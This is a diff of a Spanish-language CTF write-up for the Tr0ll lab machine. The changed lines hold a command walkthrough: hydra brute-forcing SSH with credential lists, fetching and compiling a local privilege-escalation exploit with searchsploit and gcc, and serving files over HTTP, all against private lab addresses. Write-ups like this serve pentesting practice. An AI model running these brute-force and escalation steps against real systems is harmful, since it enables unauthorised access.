@@ -116,7 +116,7 @@ ftp 192.168.1.97
 wireshark lol.pcap 2</dev/null & disown
 strings roflmao -n 13
 hydra -L which_one_lol.txt -P Pass.txt ssh://192.168.1.97
-ssh renu@192.168.1.78
+ssh overflow@192.168.1.97
 uname -a
 searchsploit -m 37292.c
 python3 -m http.server
@@ -124,4 +124,5 @@ gcc 37292.c -o escalada
 ```
 
 ## Conclusión
+
 Tr0ll es un CTF que ayuda a familiarizarse con la metodología y las fases del pentesting; las vulnerabilidades son básicas por lo que es un buen ejercicio para quienes quieren empezar a adentrarse en el área.
